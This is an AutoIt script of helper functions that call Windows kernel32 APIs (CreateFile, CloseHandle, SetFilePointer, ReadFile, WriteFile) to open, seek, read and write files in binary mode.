Func _APIFileOpen( $szFile )
Local $GENERIC_READ = 0x80000000, $GENERIC_WRITE = 0x40000000
Local $STANDARD_RIGHTS_REQUIRED = 0x000f0000
Local $SYNCHRONIZE = 0x00100000
Local $FILE_ALL_ACCESS = BitOR(0x1FF, $STANDARD_RIGHTS_REQUIRED, $SYNCHRONIZE)

Local $OPEN_ALWAYS = 4, $FILE_ATTRIBUTE_NORMAL = 0x00000080
Local $AFO_h, $AFO_ret
Local $AFO_bWrite = 1
$AFO_h = DllCall( "kernel32.dll", "hwnd", "CreateFile", _
"str", $szFile, _
"long", $FILE_ALL_ACCESS, _
"long", 7, _
"ptr", 0, _
"long", $OPEN_ALWAYS, _
"long", $FILE_ATTRIBUTE_NORMAL, _
"long", 0 )
If $AFO_h[0] = 0xFFFFFFFF Then
$AFO_bWrite = 0
$AFO_h = DllCall( "kernel32.dll", "hwnd", "CreateFile", _
"str", $szFile, _
"long", $GENERIC_READ, _
"long", 7, _
"ptr", 0, _
"long", $OPEN_ALWAYS, _
"long", $FILE_ATTRIBUTE_NORMAL, _
"long", 0 )
EndIf
$AFO_ret = DLLCall("kernel32.dll","int","GetLastError")
SetExtended($AFO_bWrite)
SetError($AFO_ret[0])
Return $AFO_h[0]
EndFunc

; _APIFileClose( <FileHandle> )
;
; The return value comes directly from "CloseHandle" api.
Func _APIFileClose( ByRef $hFile )
Local $AFC_r
$AFC_r = DllCall( "kernel32.dll", "int", "CloseHandle", _
"hwnd", $hFile )
Return $AFC_r[0]
EndFunc


; _APIFileSetPos( <FileHandle>, <Position in the file to read/write to/from> )
;
; The return value comes directly from "SetFilePointer" api.
Func _APIFileSetPos( ByRef $hFile, ByRef $nPos )
Local $FILE_BEGIN = 0 
Local $AFSP_r
$AFSP_r = DllCall( "kernel32.dll", "long", "SetFilePointer", _
"hwnd",$hFile, _
"long",$nPos, _
"long_ptr",0, _
"long",$FILE_BEGIN )
Return $AFSP_r[0] 
EndFunc


; _BinaryFileRead( <FileHandle>, <ptr buffer>)
;
; Reads file into struct <ptr buffer>
; Return from ReadFile api.
Func _BinaryFileRead( ByRef $hFile, ByRef $buff_ptr, $buff_bytes = 0)
Local $AFR_r
If $buff_bytes = 0 Then $buff_bytes = DllStructGetSize($buff_ptr)
$AFR_r = DllCall( "kernel32.dll", "int", "ReadFile", _
"hwnd", $hFile, _
"ptr",DllStructGetPtr($buff_ptr), _
"long",$buff_bytes, _
"long_ptr",0, _
"ptr",0 )
Return $AFR_r[0]
EndFunc


; _BinaryFileWrite( <FileHandle>, <ptr buffer>)
;
; Returns # of Bytes written. 
; Sets @error to the return from WriteFile api.
Func _BinaryFileWrite( ByRef $hFile, ByRef $buff_ptr, $buff_bytes = 0)
Local $AFW_r
If $buff_bytes = 0 Then $buff_bytes = DllStructGetSize($buff_ptr)
$AFW_r = DllCall( "kernel32.dll", "int", "WriteFile", _
"hwnd", $hFile, _
"ptr",DllStructGetPtr($buff_ptr), _
"long",$buff_bytes, _
"long_ptr",0, _
"ptr",0 )
SetError($AFW_r[0])
Return $AFW_r[4]
EndFunc

			
		
			
		
		
	


			

		

		
		

	




